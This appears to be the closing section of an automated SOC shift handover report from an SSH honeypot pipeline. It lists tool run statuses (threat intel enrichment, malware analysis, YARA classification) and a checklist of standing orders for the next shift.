| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (34.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 4 recon entry/entries in table (1 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-09T06:20:50Z_
